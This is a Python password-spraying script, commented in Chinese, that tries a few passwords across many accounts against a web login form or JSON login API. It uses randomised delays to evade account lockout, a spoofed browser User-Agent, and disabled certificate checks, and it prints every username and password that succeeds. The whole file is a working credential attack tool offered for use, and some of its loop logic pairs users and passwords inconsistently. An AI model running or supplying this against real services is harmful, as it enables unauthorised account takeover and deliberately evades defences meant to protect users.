#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""凭证喷洒: 少量密码打大量账号, 慢速规避锁定
用法:
  python password_spray.py -t http://target.com/login -U users.txt -P pass.txt
  python password_spray.py -t http://target.com/api/auth -U users.txt -P Spring2024! --json
"""
import argparse, json, random, re, ssl, sys, time, urllib.request, urllib.error, urllib.parse

def build_json_request(url, user, pwd, user_field, pass_field):
    data = json.dumps({user_field: user, pass_field: pwd}).encode()
    req = urllib.request.Request(url, data=data, headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Content-Type": "application/json",
    })
    return req

def build_form_request(url, user, pwd, user_field, pass_field, extra=""):
    params = urllib.parse.urlencode({user_field: user, pass_field: pwd})
    if extra:
        params += "&" + extra
    req = urllib.request.Request(url, data=params.encode(), headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Content-Type": "application/x-www-form-urlencoded",
    })
    return req

def try_login(req, ctx, timeout=10):
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read().decode("utf-8", "ignore")
            return r.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "ignore")
        return e.code, body
    except Exception:
        return None, ""

def detect_success(status, body, fail_patterns, success_patterns):
    """根据响应判断登录成功"""
    if success_patterns:
        for p in success_patterns:
            if re.search(p, body):
                return True
    if fail_patterns:
        for p in fail_patterns:
            if re.search(p, body):
                return False
        return True  # 未匹配失败模式=可能成功
    # 默认: 200/302 且长度适中=可能成功
    return status in (200, 302) and len(body) > 50

def main():
    ap = argparse.ArgumentParser(description="凭证喷洒(慢速,规避锁定)")
    ap.add_argument("-t", "--target", required=True, help="登录 URL")
    ap.add_argument("-U", "--users", required=True, help="用户名文件")
    ap.add_argument("-P", "--passwords", required=True, help="密码文件(每行一个)或单个密码")
    ap.add_argument("--json", action="store_true", help="JSON 格式请求")
    ap.add_argument("--user-field", default="username", help="用户名字段名")
    ap.add_argument("--pass-field", default="password", help="密码字段名")
    ap.add_argument("--extra", default="", help="请求中的额外字段,如 csrf_token=FUZZ")
    ap.add_argument("--delay", type=float, default=2.0, help="请求间歇(秒)")
    ap.add_argument("--jitter", type=float, default=1.0, help="延时随机扰动(秒)")
    ap.add_argument("--fail-patterns", default="", help="失败响应特征,逗号分隔")
    ap.add_argument("--success-patterns", default="", help="成功响应特征,逗号分隔")
    args = ap.parse_args()

    with open(args.users, encoding="utf-8", errors="ignore") as f:
        users = [l.strip() for l in f if l.strip()]
    with open(args.passwords, encoding="utf-8", errors="ignore") as f:
        passwords = [l.strip() for l in f if l.strip()]
    if len(passwords) == 1:
        passwords = [passwords[0] for _ in users]  # 一个密码打所有用户
    else:
        # 每个用户试所有密码
        users = [u for u in users for _ in range(len(passwords))]

    fp = args.fail_patterns.split(",") if args.fail_patterns else []
    sp = args.success_patterns.split(",") if args.success_patterns else []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    print(f"[*] 目标: {args.target} | 用户: {len(users)} | 密码: {len(passwords)}")
    print(f"[*] 间歇: {args.delay}s +-{args.jitter}s")

    tried = 0; hits = 0
    user_idx = 0
    for u in users:
        pwd = passwords[user_idx % len(passwords)]
        user_idx += 1
        if args.json:
            req = build_json_request(args.target, u, pwd, args.user_field, args.pass_field)
        else:
            req = build_form_request(args.target, u, pwd, args.user_field, args.pass_field, args.extra)
        st, body = try_login(req, ctx)
        tried += 1
        if detect_success(st, body, fp, sp):
            print(f"    [+] {u}:{pwd} -> {st} ({len(body)}B) ★ 成功!")
            hits += 1
        if tried % 10 == 0:
            print(f"    ...{tried}/{len(users) * len(passwords)}  (命中 {hits})", end="\r")
        # 慢速 + 随机扰动
        t = args.delay + random.uniform(0, args.jitter)
        time.sleep(t)
    print(f"\n[+] 完成: {tried} 次尝试, {hits} 次命中")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
